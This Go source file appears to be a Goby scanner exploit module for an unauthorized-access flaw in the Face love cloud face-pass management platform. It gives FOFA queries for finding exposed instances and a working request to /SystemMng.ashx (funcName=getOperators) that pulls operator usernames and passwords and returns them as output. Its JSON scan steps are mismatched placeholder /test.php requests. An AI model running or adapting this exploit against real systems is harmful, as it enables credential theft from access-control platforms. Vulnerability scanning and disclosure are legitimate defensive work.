package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Face love cloud a face pass intelligent management platform SystemMng.ashx Unauthorized Access Vulnerability",
    "Description": "<p>Face love cloud a face pass intelligent management platform is a set of powerful, stable operation, simple and convenient operation, beautiful user interface, easy statistics of a face pass system.</p><p>Face love cloud a face pass intelligent management platform systemng.ashx Unauthorized Access vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Product": "脸爱云 一脸通智慧管理平台",
    "Homepage": "https://www.szjiedao.com",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "title=\"欢迎使用脸爱云 一脸通智慧管理平台\"",
    "GobyQuery": "title=\"欢迎使用脸爱云 一脸通智慧管理平台\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.szjiedao.com\">https://www.szjiedao.com</a><a href=\"https://www.streamax.com/\"></a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "脸爱云一脸通智慧管理平台 SystemMng.ashx 未授权访问漏洞",
            "Product": "脸爱云 一脸通智慧管理平台",
            "Description": "<p>脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。</p><p>脸爱云一脸通智慧管理平台 SystemMng.ashx 未授权访问漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.szjiedao.com\">https://www.szjiedao.com</a><a href=\"http://www.91skzy.net\"></a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Face love cloud a face pass intelligent management platform SystemMng.ashx Unauthorized Access Vulnerability",
            "Product": "脸爱云 一脸通智慧管理平台",
            "Description": "<p>Face love cloud a face pass intelligent management platform is a set of powerful, stable operation, simple and convenient operation, beautiful user interface, easy statistics of a face pass system.</p><p>Face love cloud a face pass intelligent management platform systemng.ashx Unauthorized Access vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.szjiedao.com\">https://www.szjiedao.com</a><a href=\"https://www.streamax.com/\"></a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10878"
}`
	sendSiteIdPayload521dgwqf := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/SystemMng.ashx")
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		sendConfig.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15")
		sendConfig.Data = "page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators"
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendSiteIdPayload521dgwqf(hostInfo)
			return err ==nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"username") && strings.Contains(resp.Utf8Html, "\"password")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := sendSiteIdPayload521dgwqf(expResult.HostInfo)
			if err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"username") && strings.Contains(resp.Utf8Html, "\"password") {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}else {
				expResult.Output = err.Error()
			}
			return expResult
		},
	))
}
